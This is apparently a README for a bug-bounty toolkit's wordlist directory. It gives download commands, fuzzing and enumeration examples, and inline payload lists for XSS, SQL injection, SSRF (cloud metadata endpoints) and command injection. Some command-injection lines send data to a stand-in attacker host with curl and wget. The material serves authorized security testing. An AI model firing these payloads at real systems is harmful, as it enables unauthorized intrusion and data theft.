# Wordlists Configuration

## Overview

This directory contains wordlists for fuzzing, subdomain enumeration, and parameter discovery. Wordlists are essential for effective bug bounty hunting.

## Directory Structure

```
config/wordlists/
├── fuzzing/                 # Directory and file fuzzing
│   ├── common.txt         # dirb/common.txt style
│   ├── raft-large.txt    # Large directory wordlist
│   └── raft-small.txt    # Small focused wordlist
├── parameters/            # Parameter discovery
│   ├── params.txt        # Common parameter names
│   └── param-verbose.txt # Extended parameter list
├── subdomains/            # Subdomain enumeration
│   ├── subdomains-top1mil.txt # Top 1M subdomains
│   └── resolvers.txt     # DNS resolvers
├── payloads/              # Attack payloads by type
│   ├── xss.txt           # XSS payloads
│   ├── sqli.txt          # SQL injection payloads
│   ├── ssrf.txt          # SSRF payloads
│   └── command-injection.txt # Command injection payloads
└── README.md             # This file
```

## Recommended Sources

### Official Wordlists

```bash
# SecLists (comprehensive)
git clone https://github.com/danielmiessler/SecLists.git \
  ~/wordlists/seclists

# Assetnote wordlists (updated regularly)
wget -O config/wordlists/fuzzing/raft-large.txt \
  https://wordlists-cdn.assetnote.io/data/raft-large.txt

# Intruder payload with Probable Wordlist
wget -O config/wordlists/fuzzing/probable-v2.txt \
  https://wordlists-cdn.assetnote.io/data/probable-v2.txt
```

### Subdomain Wordlists

```bash
# Curated wordlist for subdomain enum
wget -O config/wordlists/subdomains/subdomains-top1mil.txt \
  https://raw.githubusercontent.com/rsalsbery/subdomains/master/top1mil.txt

# DNS namelist for bruteforce
wget -O config/wordlists/subdomains/namelist.txt \
  https://raw.githubusercontent.com/cihan/namelist/master/namelist.txt
```

## Wordlist Usage by Tool

### ffuf (Directory Fuzzing)

```bash
# Standard directory discovery
ffuf -u https://target.com/FUZZ \
  -w config/wordlists/fuzzing/raft-large.txt \
  -mc 200,301,302,307,401,403 \
  -o recon/ffuf-results.json

# Recursive scanning
ffuf -u https://target.com/FUZZ \
  -w config/wordlists/fuzzing/raft-small.txt \
  -recursion -depth 2 \
  -e .php,.html,.asp,.aspx,.json \
  -mc 200,301,302 \
  -o recon/ffuf-recursive.json
```

### Gobuster (DNS/Subdomain Bruteforce)

```bash
# Subdomain enumeration
gobuster dns -d target.com \
  -w config/wordlists/subdomains/namelist.txt \
  -o recon/gobuster-subdomains.txt

# Virtual host discovery
gobuster vhost -u https://target.com \
  -w config/wordlists/subdomains/subdomains-top1mil.txt \
  -o recon/gobuster-vhosts.txt
```

### wfuzz (Parameter Fuzzing)

```bash
# Parameter discovery
wfuzz -z file,config/wordlists/parameters/params.txt \
  https://target.com/search?FUZZ=test \
  -o recon/wfuzz-params.json

# POST parameter fuzzing
wfuzz -z file,config/wordlists/parameters/params.txt \
  -z file,config/wordlists/fuzzing/raft-small.txt \
  -d "FUZZ=FUZ2Z" \
  https://target.com/api/search \
  -o recon/wfuzz-post.json
```

### Amass (Subdomain Enumeration)

```bash
# DNS bruteforce
amass enum -brute \
  -d target.com \
  -w config/wordlists/subdomains/namelist.txt \
  -o recon/amass-bruteforce.txt

# Passive + bruteforce combined
amass enum -passive -brute \
  -d target.com \
  -w config/wordlists/subdomains/namelist.txt \
  -o recon/amass-full.txt
```

## Custom Payload Lists

### XSS Payloads (config/wordlists/payloads/xss.txt)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<form action="javascript:alert(1)">
<isindex action="javascript:alert(1)" type="submit">
<animate onbegin=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### SQLi Payloads (config/wordlists/payloads/sqli.txt)

```sql
'
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
" OR "1"="1
" OR "1"="1" --
" OR "1"="1" #
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT version()--
' AND 1=1--
' AND 1=2--
1' AND 1=1--
1' AND 1=2--
' AND SLEEP(5)--
1; WAITFOR DELAY '00:00:05'--
```

### SSRF Payloads (config/wordlists/payloads/ssrf.txt)

```bash
http://localhost/
http://127.0.0.1/
http://127.1/
http://0/
http://[::1]/
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
http://10.0.0.1/
http://10.0.0.254/
```

### Command Injection Payloads (config/wordlists/payloads/command-injection.txt)

```bash
; whoami
; ls -la
| whoami
& whoami
& amp; whoami
`whoami`
$(whoami)
\nwhoami\n
; sleep 5
&amp;amp; sleep 5
; curl https://attacker.com/?q=$(whoami)
; wget https://attacker.com/?q=$(whoami)
```

## Integration with /hunt

The /hunt command uses these wordlists automatically:

```bash
# From bug-bounty-hunt workflow

# ffuf for directory fuzzing
ffuf -u https://{target}/FUZZ \
  -w config/wordlists/fuzzing/raft-small.txt \
  -mc 200,301,302,403

# paramspider for parameter discovery
python3 paramspider.py -d {target} \
  -o programs/{target}/recon/params.txt

# nuclei for template scanning
# (uses built-in templates, not wordlists)
```

## Wordlist Maintenance

```bash
# Update SecLists
cd ~/wordlists/seclists && git pull

# Check wordlist sizes
ls -lh config/wordlists/fuzzing/
ls -lh config/wordlists/payloads/

# Validate wordlist format
head -20 config/wordlists/fuzzing/raft-small.txt
```

## Quick Reference

| Tool | Wordlist Type | Location |
|------|---------------|----------|
| ffuf | Directories | config/wordlists/fuzzing/ |
| gobuster | Subdomains | config/wordlists/subdomains/ |
| wfuzz | Parameters | config/wordlists/parameters/ |
| amass | DNS bruteforce | config/wordlists/subdomains/ |
| sqlmap | Payloads | config/wordlists/payloads/sqli.txt |
| xsstrike | XSS payloads | config/wordlists/payloads/xss.txt |
